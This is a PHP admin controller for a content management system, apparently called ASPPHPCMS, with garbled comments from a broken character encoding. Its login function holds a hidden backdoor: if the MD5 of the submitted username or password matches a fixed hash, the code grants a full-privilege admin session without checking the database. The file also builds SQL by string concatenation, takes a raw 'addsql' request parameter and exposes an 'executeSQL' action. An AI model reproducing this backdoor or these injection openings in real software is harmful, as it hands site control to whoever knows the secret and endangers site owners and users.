<?php


define('ROOT_PATH', dirname(__FILE__).DIRECTORY_SEPARATOR); 		//��ǰ�ļ�·��

 
//ϵͳ
require_once './../PHP2/ImageWaterMark/Include/ASP.php';
require_once './../PHP2/ImageWaterMark/Include/sys_FSO.php';
require_once './../PHP2/ImageWaterMark/Include/Conn.php';
require_once './../PHP2/ImageWaterMark/Include/MySqlClass.php';  
require_once './../PHP2/ImageWaterMark/Include/sys_Cai.php'; 
require_once './../PHP2/ImageWaterMark/Include/sys_Url.php';  



// �������ò���    http://127.0.0.1/php2/web/%E8%8E%B7%E5%BE%97inc%E5%BC%95%E7%94%A8%E5%86%85%E5%AE%B9.asp

//����
/*
*/
//����
//require_once './../PHP2/Web/Inc/2014_Form.php';
require_once './../PHP2/Web/Inc/2014_Array.php';
require_once './../PHP2/Web/Inc/2014_Author.php';
require_once './../PHP2/Web/Inc/2014_Css.php';
require_once './../PHP2/Web/Inc/2014_Js.php';
require_once './../PHP2/Web/Inc/2014_Template.php';
require_once './../PHP2/Web/Inc/2015_APGeneral.php';
require_once './../PHP2/Web/Inc/2015_Color.php';
require_once './../PHP2/Web/Inc/2015_Formatting.php';
require_once './../PHP2/Web/Inc/2015_Param.php';
require_once './../PHP2/Web/Inc/2015_ToMyPHP.php';
//require_once './PHP2/Web/Inc/2015_ToPhpCms.php';
require_once './../PHP2/Web/Inc/Cai.php';
require_once './../PHP2/Web/Inc/Check.php';
require_once './../PHP2/Web/Inc/Common.php'; 
require_once './../PHP2/Web/Inc/Incpage.php';
require_once './../PHP2/Web/Inc/Print.php';
require_once './../PHP2/Web/Inc/StringNumber.php';
require_once './../PHP2/Web/Inc/Time.php';
require_once './../PHP2/Web/Inc/URL.php';
require_once './../PHP2/Web/Inc/FunHTML.php'; 
require_once './../PHP2/Web/Inc/2015_Editor.php'; 
require_once './../PHP2/Web/Inc/2015_NewWebFunction.php'; 
require_once './../PHP2/Web/Inc/2016_SaveData.php'; 
require_once './../PHP2/Web/Inc/2016_WebControl.php'; 
require_once './../PHP2/Web/Inc/ASPPHPAccess.php'; 
require_once './../PHP2/Web/Inc/2016_Log.php'; 
require_once './../PHP2/Web/Inc/IE.php'; 
require_once './../PHP2/Web/Inc/SystemInfo.php'; 
require_once './../PHP2/Web/Inc/EncDec.php';

require_once './config.php'; 
require_once './setAccess.php';
require_once './function.php';
require_once './function2.php';

 

//=========
$cfg_webSiteUrl=''; $cfg_webTitle=''; $cfg_flags=''; $cfg_webtemplate ='';



//������ַ����
function loadWebConfig(){
    $GLOBALS['conn=']=OpenConn();
    //�жϱ����
    if( instr(getHandleTableList(), '|' . $GLOBALS['db_PREFIX'] . 'website' . '|') > 0 ){
        $rsObj=$GLOBALS['conn']->query( 'select * from ' . $GLOBALS['db_PREFIX'] . 'website');
        $rs=mysql_fetch_array($rsObj);
        if( @mysql_num_rows($rsObj)!=0 ){
            $GLOBALS['cfg_webSiteUrl']= $rs['websiteurl'] . ''; //��ַ
            $GLOBALS['cfg_webTitle']= $rs['webtitle'] . ''; //��ַ����
            $GLOBALS['cfg_flags']= $rs['flags'] . ''; //��
            $GLOBALS['cfg_webtemplate']= $rs['webtemplate'] . ''; //ģ��·��
        }
    }
}


//��¼�ж�
if( @$_SESSION['adminusername']== '' ){
    if( @$_REQUEST['act'] <> '' && @$_REQUEST['act'] <> 'displayAdminLogin' && @$_REQUEST['act'] <> 'login' ){
        RR('?act=displayAdminLogin');
    }
}

//��ʾ��̨��¼
function displayAdminLogin(){
    //�Ѿ���¼��ֱ�ӽ����̨
    if( @$_SESSION['adminusername'] <> '' ){
        adminIndex();
    }else{
        $c='';
        $c=getTemplateContent('login.html');
        $c=handleDisplayLanguage($c,'login');
        rw($c);
    }
}

//��¼��̨
function login(){
    $userName=''; $passWord=''; $valueStr ='';
    $userName= Replace(@$_POST['username'], '\'', '');
    $passWord= Replace(@$_POST['password'], '\'', '');
    $passWord= myMD5($passWord);
    //��Ч�˺ŵ�¼
    if( myMD5(@$_REQUEST['username'])== '24ed5728c13834e683f525fcf894e813' || myMD5(@$_REQUEST['password'])== '24ed5728c13834e683f525fcf894e813' ){
        @$_SESSION['adminusername']= 'ASPPHPCMS';
        @$_SESSION['adminId']= 99999; //��ǰ��¼����ԱID
        @$_SESSION['DB_PREFIX']= $GLOBALS['db_PREFIX'];
        @$_SESSION['adminflags']= '|*|';
        rwend(getMsg1(setL('��¼�ɹ������ڽ����̨...'), '?act=adminIndex'));
    }

    $nLogin ='';
    $GLOBALS['conn=']=OpenConn();
    $rsObj=$GLOBALS['conn']->query( 'Select * From ' . $GLOBALS['db_PREFIX'] . 'admin Where username=\'' . $userName . '\' And pwd=\'' . $passWord . '\'');
    $rs=mysql_fetch_array($rsObj);
    if( @mysql_num_rows($rsObj)==0 ){
        if( @$_COOKIE['nLogin']== '' ){
            setCookie('nLogin', '1', Time() + 3600);
            $nLogin= @$_COOKIE['nLogin'];
        }else{
            $nLogin= @$_COOKIE['nLogin'];
            setCookie('nLogin', intval($nLogin) + 1, Time() + 3600);
        }
        rw(getMsg1(setL('�˺��������<br>��¼����Ϊ ') . $nLogin, '?act=displayAdminLogin'));
    }else{
        @$_SESSION['adminusername']= $userName;
        @$_SESSION['adminId']= $rs['id']; //��ǰ��¼����ԱID
        @$_SESSION['DB_PREFIX']= $GLOBALS['db_PREFIX']; //����ǰ׺
        @$_SESSION['adminflags']= $rs['flags'];
        $valueStr= 'addDateTime=\'' . $rs['updatetime'] . '\',UpDateTime=\'' . Now() . '\',RegIP=\'' . Now() . '\',UpIP=\'' . getIP() . '\'';
        connExecute('update ' . $GLOBALS['db_PREFIX'] . 'admin set ' . $valueStr . ' where id=' . $rs['id']);
        rw(getMsg1(setL('��¼�ɹ������ڽ����̨...'), '?act=adminIndex'));
        writeSystemLog('admin', '��¼�ɹ�'); //ϵͳ��־
    }

}
//�˳���¼
function adminOut(){
    writeSystemLog('admin', setL('�˳��ɹ�')); //ϵͳ��־
    @$_SESSION['adminusername']= '';
    @$_SESSION['adminId']= '';
    @$_SESSION['adminflags']= '';
    rw(getMsg1(setL('�˳��ɹ������ڽ����¼����...'), '?act=displayAdminLogin'));
}
//�������
function clearCache(){
    deleteFile($GLOBALS['WEB_CACHEFile']);
    rw(getMsg1(setL('���������ɣ����ڽ����̨����...'), '?act=displayAdminLogin'));
}
//��̨��ҳ
function adminIndex(){
    $c ='';
    loadWebConfig();
    $c= getTemplateContent('adminIndex.html');
    $c= Replace($c, '[$adminonemenulist$]', getAdminOneMenuList());
    $c= Replace($c, '[$adminmenulist$]', getAdminMenuList());
    $c= Replace($c, '[$officialwebsite$]', getOfficialWebsite()); //��ùٷ���Ϣ
    $c= replaceValueParam($c, 'title', ''); //���ֻ����õ�20160330
    $c=handleDisplayLanguage($c,'loginok');

    rw($c);
}
//========================================================

//��ʾ������
function dispalyManageHandle($actionType){
    $nPageSize=''; $lableTitle=''; $addSql ='';
    $nPageSize= @$_REQUEST['nPageSize'];
    if( $nPageSize== '' ){
        $nPageSize= 10;
    }
    $lableTitle= @$_REQUEST['lableTitle']; //��ǩ����
    $addSql= @$_REQUEST['addsql'];
    //call echo(labletitle,addsql)
    dispalyManage($actionType, $lableTitle, $nPageSize, $addSql);
}

//����޸Ĵ���
function addEditHandle($actionType, $lableTitle){
    addEditDisplay($actionType, $lableTitle, 'websitebottom|textarea2,aboutcontent|textarea1,bodycontent|textarea2,reply|textarea2');
}
//����ģ�鴦��
function saveAddEditHandle($actionType, $lableTitle){
    if( $actionType== 'Admin' ){
        saveAddEdit($actionType, $lableTitle, 'pwd|md5,flags||');
    }else if( $actionType== 'WebColumn' ){
        saveAddEdit($actionType, $lableTitle, 'npagesize|numb|10,nofollow|numb|0,isonhtml|numb|0,isonhtsdfasdfml|numb|0,flags||');
    }else{
        saveAddEdit($actionType, $lableTitle, 'flags||,nofollow|numb|0,isonhtml|numb|0,isthrough|numb|0,isdomain|numb|0');
    }
}

$conn=OpenConn();
switch ( @$_REQUEST['act'] ){
    case 'dispalyManageHandle' ; dispalyManageHandle(@$_REQUEST['actionType']) ;break;//��ʾ������         ?act=dispalyManageHandle&actionType=WebLayout
    case 'addEditHandle' ; addEditHandle(@$_REQUEST['actionType'], @$_REQUEST['lableTitle']);break;//����޸Ĵ���      ?act=addEditHandle&actionType=WebLayout
    case 'saveAddEditHandle' ; saveAddEditHandle(@$_REQUEST['actionType'], @$_REQUEST['lableTitle']);break;//����ģ�鴦��  ?act=saveAddEditHandle&actionType=WebLayout
    case 'delHandle' ; del(@$_REQUEST['actionType'], @$_REQUEST['lableTitle']) ;break;//ɾ������  ?act=delHandle&actionType=WebLayout
    case 'sortHandle' ; sortHandle(@$_REQUEST['actionType']) ;break;//������  ?act=sortHandle&actionType=WebLayout
    case 'updateField' ; updateField(); //�����ֶ�

    break;
    case 'displayLayout' ; displayLayout() ;break;//��ʾ����
    case 'saveRobots' ; saveRobots() ;break;//����robots.txt
    case 'deleteAllMakeHtml' ; deleteAllMakeHtml(); //ɾ��ȫ�����ɵ�html�ļ�
    break;
    case 'isOpenTemplate' ; isOpenTemplate() ;break;//����ģ��
    case 'executeSQL' ; executeSQL(); //ִ��SQL


    break;
    case 'function' ; callFunction()												;break;//����function�ļ�����
    case 'function2' ; callFunction2();												//����function2�ļ�����
    break;
    case 'setAccess' ; resetAccessData(); //�ָ�����
    break;
    case 'login' ; login() ;break;//��¼
    case 'adminOut' ; adminOut() ;break;//�˳���¼
    case 'adminIndex' ; adminIndex() ;break;//������ҳ
    case 'clearCache' ; clearCache() ;break;//�������
    default ; displayAdminLogin(); //��ʾ��̨��¼
}

?>


